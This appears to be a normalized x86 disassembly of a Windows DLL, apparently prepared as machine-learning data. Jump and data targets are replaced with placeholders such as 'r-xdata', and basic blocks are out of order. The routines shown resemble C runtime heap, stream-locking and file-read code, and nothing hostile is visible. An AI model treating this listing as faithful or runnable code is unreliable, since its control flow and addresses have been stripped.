jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_1001bc96
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_1001b8ad
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
test ecx ecx
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
add ebx 0x14
call sub_1001b7fd
mov ebx eax
mov [ ebp + 0x8 ] ebx
test ebx ebx
jne r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_1001bf7b
push 0x10
push r--data
call sub_10018984
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c011
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
mov esi edi
shl esi 0x2
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_100119e7
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_10011c31
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
inc [ ebp - 0x1c ]
sub_1001c01a
push 0x10
push r--data
call sub_10018984
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c149
mov eax edi
call sub_100189c9
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_100166a9
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_1001d612
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_10011c31
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10013570
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_1001a3c7
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_100135de
pop ecx
pop ecx
sub_1001c154
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_1001c1e4
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10021455
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10021474
jmp r-xdata
sub_1001c1e4
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10010789
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_1001c154
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1001c246
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_1001c276
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001c2a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_10016806
mov [ eax ] ebx
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_10016806
mov [ eax ] ebx
call sub_100167f3
mov [ eax ] 0x9
jmp r-xdata
call sub_10016806
mov [ eax ] ebx
call sub_100167f3
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_100166a9
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_1001fd25
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_100167f3
mov [ eax ] 0xc
call sub_10016806
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_10016819
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_10011c31
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_100167f3
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_1001fd25
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1001fd25
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_1001fd25
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_1001c869
push 0x10
push r--data
call sub_10018984
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] esi
call sub_100167f3
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_100189c9
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_100202c9
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_10016806
mov [ eax ] esi
call sub_100167f3
mov [ eax ] 0x16
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x9
